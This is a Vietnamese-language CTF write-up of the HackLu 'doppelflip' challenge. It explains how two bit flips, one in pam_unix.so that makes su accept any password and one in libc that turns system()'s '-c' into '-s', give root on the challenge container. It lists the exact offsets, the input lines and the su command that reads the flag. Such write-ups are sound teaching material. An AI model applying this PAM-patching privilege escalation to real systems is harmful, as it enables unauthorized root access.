# doppelflip — HackLu misc

Flag đã được kiểm tra trực tiếp trên instance remote:

```text
flag{the_odds_of_this_happening_due_to_cosmic_rays_are_small_but_not_zero}
```

## 1. Phạm vi và bằng chứng

Các file được cung cấp trong thư mục challenge:

```text
compose.yml
Dockerfile
doppelflip.c
flag.txt
```

SHA-256 của các file gốc:

| File | SHA-256 |
|---|---|
| `doppelflip.c` | `70e2df8fcc5f78e77d8f801a72a61eb3f8f0fd93a7ae4a7e1f9057cbc9c37ffd` |
| `Dockerfile` | `02d34cafd2d7a75abbf3be3d76ab86a04217f0289e3c403c3687d2bf241b6590` |
| `compose.yml` | `4218314c72b35a05e5f7b47fb1bcaf6f965f404905504ee1f055e1d3d1d99174` |
| `doppelflip.zip` | `c4456a1a62d260d589c20fa0ddff22f34361e7f1eec1e1d0271b0c7327ecbca9` |

`flag.txt` trong archive chỉ là flag mồi cho local build. Flag thật của instance nằm ở `/flag.txt` trong container remote.

Dockerfile ghim Ubuntu bằng digest:

```text
sha256:c098726dd9b9733f3e885f8de0ef375206a311b0a317eadc40d347b1115fb944
```

Các offset bên dưới phụ thuộc vào đúng runtime/library của image này.

Hash của hai thư viện runtime chưa chỉnh sửa được dùng để xác định đúng build:

| Library | SHA-256 |
|---|---|
| `/lib/x86_64-linux-gnu/security/pam_unix.so` | `3f46fede241e5c64c0f217d1e068ac4c22a0da3a77ced08be956f167b52ff03b` |
| `/lib/x86_64-linux-gnu/libc.so.6` | `85e64f97e348786a8fb4d9f3d52fec289e2fb86bba20f0731dfe61990525e0f7` |

## 2. Đọc source: hai bit flip xảy ra trước khi hạ quyền

`prepare_flip()` nhận ba giá trị cho mỗi lần flip:

```c
file_path   -> %255s
byte_offset -> %lld
bit_offset  -> %d, trong khoảng 0..7
```

Nó mở file bằng quyền hiện tại của process:

```c
*fd = open(file_path, O_RDWR | O_CLOEXEC);
```

Sau đó đọc một byte, tính:

```c
*byte ^= (1 << bit_offset);
```

và giữ file descriptor mở. Hai byte chỉ được ghi xuống file sau đoạn:

```c
setgroups(0, NULL);
setresgid(1000, 1000, 1000);
setresuid(1000, 1000, 1000);
```

Cuối cùng chương trình dùng raw syscall để ghi từng byte đã flip, đóng hai descriptor rồi `execve()` executable đầu tiên trong `argv`.

Điểm quan trọng là file được mở lúc process còn là root, còn thao tác ghi xảy ra sau khi UID đã thành 1000. Vì vậy có thể sửa các file root-owned mà user `ubuntu` bình thường không thể ghi.

## 3. Vì sao phải sửa hai thư viện khác nhau?

Dockerfile chạy:

```text
/doppelflip /usr/bin/socat stdio system:echo hello flux
```

Có hai trở ngại độc lập:

1. `socat` chạy sau khi `doppelflip` đã hạ UID xuống 1000.
2. Lệnh `system:echo hello flux` vốn chỉ in `hello flux`, không cho ta nhập lệnh tùy ý.

Một bit được dùng để buộc PAM báo authentication thành công cho `su`. Bit còn lại đổi cách `system()` gọi shell, biến stdin của kết nối thành nguồn lệnh.

## 4. Flip thứ nhất: ép `pam_unix` trả về thành công

File mục tiêu:

```text
/lib/x86_64-linux-gnu/security/pam_unix.so
```

Tại file offset `0x9034` (decimal `36916`), byte gốc là `c3`. Vùng disassembly liên quan:

```asm
9026: call   7b90       ; kiểm tra mật khẩu
9032: ...
9033: 89 c3             mov    ebx,eax
9035: e9 fe fe ff ff    jmp    8f38
```

Giá trị trả về của hàm kiểm tra nằm trong `EAX`. Lệnh `mov ebx,eax` lưu kết quả lỗi vào `EBX`; cuối hàm, `EBX` được đưa lại vào `EAX` để trả về cho PAM.

Flip bit 0 của byte thứ hai trong instruction (`c3 -> c2`):

```text
0xc3 XOR 0x01 = 0xc2
```

Instruction trở thành:

```asm
89 c2             mov    edx,eax
```

Kết quả kiểm tra không còn được ghi vào `EBX`. Trong path mà `su` dùng, `EBX` vẫn là zero từ trước lời gọi kiểm tra; vì vậy `pam_sm_authenticate()` trả về `0` dù mật khẩu không đúng. `su` sau đó chạy với quyền root.

Payload cho flip này:

```text
file: /lib/x86_64-linux-gnu/security/pam_unix.so
byte: 36916
bit:  0
```

Patch ledger của flip thứ nhất:

| Offset | Byte gốc | Mask | Byte mới | Ý nghĩa |
|---:|---:|---:|---:|---|
| `0x9034` / `36916` | `c3` | `01` | `c2` | `mov ebx,eax` thành `mov edx,eax` |

Đây là file offset, không phải runtime virtual address. Với ELF runtime này, đoạn text của module có mapping file-backed tương ứng nên offset đọc bằng `lseek()` chính là tọa độ cần nhập cho challenge.

## 5. Flip thứ hai: đổi `sh -c` thành `sh -s`

File mục tiêu:

```text
/lib/x86_64-linux-gnu/libc.so.6
```

Trong implementation của `system()`, libc chứa chuỗi:

```text
... .c\0-c\0--\0/bin/sh\0 ...
```

Ở offset `0x1db794` (decimal `1947540`) có byte ASCII của ký tự `c` trong chuỗi `-c`:

```text
0x63 = 'c'
```

Flip bit 4:

```text
0x63 XOR 0x10 = 0x73 = 's'
```

Do đó shell con được gọi với `-s` thay vì `-c`. Thay vì thực thi cố định `echo hello flux`, `/bin/sh` đọc script từ stdin. stdin chính là kết nối netcat nên ta có thể gửi lệnh sau khi thấy thông báo start.

Payload cho flip này:

```text
file: /lib/x86_64-linux-gnu/libc.so.6
byte: 1947540
bit:  4
```

Patch ledger của flip thứ hai:

| Offset | Byte gốc | Mask | Byte mới | Ý nghĩa |
|---:|---:|---:|---:|---|
| `0x1db794` / `1947540` | `63` (`c`) | `10` | `73` (`s`) | chuỗi `-c` thành `-s` |

Điểm cần nhớ: sửa libc trên đĩa chỉ ảnh hưởng process được `execve()` sau đó, ở đây là `socat` và các process con của nó. Không cần sửa mapping libc hiện tại của `doppelflip`.

## 6. Trình tự tương tác

Sau PoW, gửi đúng sáu dòng sau:

```text
/lib/x86_64-linux-gnu/security/pam_unix.so
36916
0
/lib/x86_64-linux-gnu/libc.so.6
1947540
4
```

Phải đợi server in:

```text
Flipping & starting /usr/bin/socat
```

rồi mới gửi lệnh shell:

```sh
printf '\n' | su -c 'id; cat /flag.txt' 2>&1
exit
```

`printf '\n'` cung cấp một mật khẩu rỗng cho `su`. Nếu gửi lệnh shell cùng packet với sáu dòng `scanf`, phần dữ liệu thừa có thể bị `scanf()` nuốt vào buffer và shell sẽ không nhận được lệnh.

Output xác nhận exploit thành công:

```text
uid=0(root) gid=0(root) groups=0(root)
flag{the_odds_of_this_happening_due_to_cosmic_rays_are_small_but_not_zero}
```

## 7. Solver hoàn chỉnh

`solve.py` trong cùng thư mục tự giải PoW, gửi hai flip, chờ đúng thời điểm rồi gửi shell command:

```sh
python3 solve.py
```

Có thể truyền host/port khác nếu cần:

```sh
python3 solve.py doppelflip.flu.xxx 1337
```

## 8. Các bẫy dễ gặp

- Đường dẫn flag là `/flag.txt`, không phải `/flag`.
- `flag.txt` local trong archive là dữ liệu mồi; không dùng nó làm đáp án.
- Mở `/doppelflip` để sửa trực tiếp thường gặp `Text file busy` vì executable đang chạy.
- Sửa syscall `setresuid` trong libc trên disk không giải quyết được process hiện tại: mapping đã được nạp từ lower layer trước khi overlay copy-up. PAM ở process `su` là vị trí phù hợp hơn.
- Offset phải là decimal khi nhập vào challenge; `0x9034 = 36916` và `0x1db794 = 1947540`.
- Bit offset là chỉ số từ 0, nên bit 4 tương ứng mask `0x10`.

## Kết luận

Hai bit flip có tác dụng nối tiếp:

```text
pam_unix: mov ebx,eax -> mov edx,eax
libc:     "-c"       -> "-s"
```

Kết quả là shell stdin được mở, `su` được PAM cho qua và chạy root, rồi đọc được `/flag.txt`.

